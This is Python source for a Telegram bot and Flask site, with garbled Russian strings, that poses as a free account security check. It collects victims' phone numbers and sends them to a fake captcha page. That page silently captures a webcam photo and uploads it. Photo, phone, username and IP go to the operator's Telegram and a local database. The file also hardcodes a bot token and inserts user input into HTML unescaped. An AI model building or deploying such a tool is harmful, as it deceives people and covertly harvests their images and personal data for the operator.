import os
import threading
import time
import sqlite3
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import logging
import random

# === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞ ===
TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # –¢–≤–æ–π —Ç–æ–∫–µ–Ω
ADMIN_ID = 2054091032  # –¢–≤–æ–π Telegram ID
BOT_PORT = 8000
SITE_PORT = 5000
PHOTOS_DIR = "photos"
DB_PATH = "users.db"

os.makedirs(PHOTOS_DIR, exist_ok=True)

# === –õ–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏–µ ===
logging.basicConfig(level=logging.INFO)

# === –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö ===
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id TEXT PRIMARY KEY,
            username TEXT,
            phone TEXT,
            ip TEXT,
            photo_path TEXT,
            authorized INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def add_user(user_id, username, phone, ip, photo_path=None):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        INSERT OR REPLACE INTO users (user_id, username, phone, ip, photo_path, authorized)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, username, phone, ip, photo_path, 1 if photo_path else 0))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM users")
    data = cur.fetchall()
    conn.close()
    return data

def get_user_by_username(username):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE username=?", (username,))
    data = cur.fetchone()
    conn.close()
    return data

init_db()

# === –°–∞–π—Ç (Flask) –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ ===
app = Flask(__name__)
TELEGRAM_BOT_TOKEN = TOKEN

@app.route('/auth')
def auth():
    user_id = request.args.get('user_id')
    username = request.args.get('username')
    phone = request.args.get('phone')

    if not all([user_id, username, phone]):
        return "‚ùå –ù–µ —Ö–≤–∞—Ç–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤", 400

    html = '''
<!DOCTYPE html>
<html lang="ru">
<head><title>üîê –ö–∞–ø—á–∞</title></head>
<body style="text-align:center; padding-top: 50px;">
<h2>‚è≥ –í–∞—à–∞ –∫–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞</h2>

<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, 'selfie.png');
                formData.append('user_id', "%s");
                formData.append('username', "%s");
                formData.append('phone', "%s");

                fetch('/save-photo', {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    document.body.innerHTML = `
                        <h2>‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞</h2>
                        <p>–í—ã —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É.</p>
                        <p>–ú–æ–∂–µ—Ç–µ –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ Telegram.</p>
                    `;
                });
            }, 'image/png');
        }, 3000);
    })
    .catch(err => {
        alert("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ.");
        console.error(err);
    });
</script>
</body>
</html>
''' % (user_id, username, phone)

    return html

@app.route('/save-photo', methods=['POST'])
def save_photo():
    photo = request.files['photo']
    user_id = request.form.get('user_id')
    username = request.form.get('username')
    phone = request.form.get('phone')
    ip = request.remote_addr

    try:
        photo_path = None
        if photo:
            filename = f"{user_id}_{username}.png"
            path = os.path.join(PHOTOS_DIR, filename)
            photo.save(path)
            photo_path = path

        add_user(user_id, username, phone, ip, photo_path)

        # === –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –≤ Telegram ===
        url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": user_id,
            "text": "‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!\n\n–í—ã —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.",
        }
        requests.post(url, data=data)

        # === –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –∞–¥–º–∏–Ω—É ===
        message = (
            f"üì∏ –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!\n"
            f"–ù–æ–º–µ—Ä: {phone}\n"
            f"–Æ–∑–µ—Ä–Ω–µ–π–º: @{username}\n"
            f"IP: {ip}\n"
            f"ID: {user_id}"
        )

        if photo_path and os.path.exists(photo_path):
            with open(photo_path, 'rb') as f:
                files = {'photo': f}
                data_admin = {
                    'chat_id': ADMIN_ID,
                    'caption': message
                }
                requests.post(f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendPhoto",
                              data=data_admin, files=files)
        else:
            data_admin = {
                'chat_id': ADMIN_ID,
                'text': message
            }
            requests.post(f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage", data=data_admin)

        return 'OK'
    except Exception as e:
        print("–û—à–∏–±–∫–∞ —Å–∞–π—Ç–∞:", e)
        return 'Error', 500

def run_site():
    app.run(host='0.0.0.0', port=SITE_PORT)

# === –ö–æ–º–∞–Ω–¥—ã –±–æ—Ç–∞ ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("üß† –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –º–æ–π –≥–æ—Å–ø–æ–¥–∏–Ω.")
        return

    keyboard = [[InlineKeyboardButton("‚úÖ –ü—Ä–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É", callback_data="agree")]]
    await update.message.reply_text(
        "üîç –ú—ã –ø—Ä–µ–¥–ª–∞–≥–∞–µ–º –±–µ—Å–ø–ª–∞—Ç–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å.\n"
        "–ù–æ –ø–µ—Ä–µ–¥ —ç—Ç–∏–º –ø—Ä–æ–π–¥–∏—Ç–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def agree_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    contact_button = KeyboardButton(text="üìû –û—Ç–ø—Ä–∞–≤–∏—Ç—å –º–æ–π –Ω–æ–º–µ—Ä", request_contact=True)
    keyboard = [[contact_button], [KeyboardButton(text="‚úçÔ∏è –í–≤–µ—Å—Ç–∏ –≤—Ä—É—á–Ω—É—é")]]
    await query.message.reply_text(
        "üî¢ –î–ª—è –Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä.",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.contact:
        phone = update.message.contact.phone_number
        user = update.effective_user
        link = f"http://localhost:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
        await update.message.reply_text("üîÑ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ—á—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        await update.message.reply_text(f"üåê –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ:\n{link}")
    elif update.message.text == "‚úçÔ∏è –í–≤–µ—Å—Ç–∏ –≤—Ä—É—á–Ω—É—é":
        await update.message.reply_text("üìû –í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:")
    else:
        phone = update.message.text
        user = update.effective_user
        link = f"http://localhost:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
        await update.message.reply_text("üîÑ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ—á—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        await update.message.reply_text(f"üåê –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ:\n{link}")

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if len(context.args) == 0:
        users = get_all_users()
        text = "üë§ –°–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:\n\n"
        for u in users:
            text += f"@{u[1]} (ID: {u[0]})\n"
        await update.message.reply_text(text)
    else:
        username = context.args[0]
        user = get_user_by_username(username)
        if user:
            msg = (
                f"üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ @{user[1]}:\n"
                f"ID: {user[0]}\n"
                f"–ù–æ–º–µ—Ä: {user[2]}\n"
                f"IP: {user[3]}"
            )
            await update.message.reply_text(msg)
            if user[4] and os.path.exists(user[4]):
                try:
                    time.sleep(2)
                    await update.message.reply_photo(photo=open(user[4], 'rb'))
                except Exception as e:
                    await update.message.reply_text(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ: {e}")
            else:
                await update.message.reply_text("‚ö†Ô∏è –§–æ—Ç–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ")
        else:
            await update.message.reply_text("‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.")

async def cleardb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    # –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Ñ–æ—Ç–æ
    for f in os.listdir(PHOTOS_DIR):
        os.remove(os.path.join(PHOTOS_DIR, f))

    # –£–¥–∞–ª–µ–Ω–∏–µ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
        init_db()

    await update.message.reply_text("üßπ –í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ—á–∏—â–µ–Ω—ã.")

# === main ===
async def post_init(application):
    print("üöÄ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")

def run_bot():
    application = ApplicationBuilder().token(TOKEN).post_init(post_init).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("cleardb", cleardb_command))
    application.add_handler(CallbackQueryHandler(agree_handler, pattern="agree"))
    application.add_handler(MessageHandler(filters.ALL, handle_message))

    print("ü§ñ –ë–æ—Ç –≥–æ—Ç–æ–≤ –ø—Ä–∏–Ω–∏–º–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã...")
    application.run_polling()

# === –ó–∞–ø—É—Å–∫ —Å–∞–π—Ç–∞ –∏ –±–æ—Ç–∞ –≤–º–µ—Å—Ç–µ ===
if __name__ == '__main__':
    site_thread = threading.Thread(target=run_site)
    site_thread.daemon = True
    site_thread.start()

    run_bot()
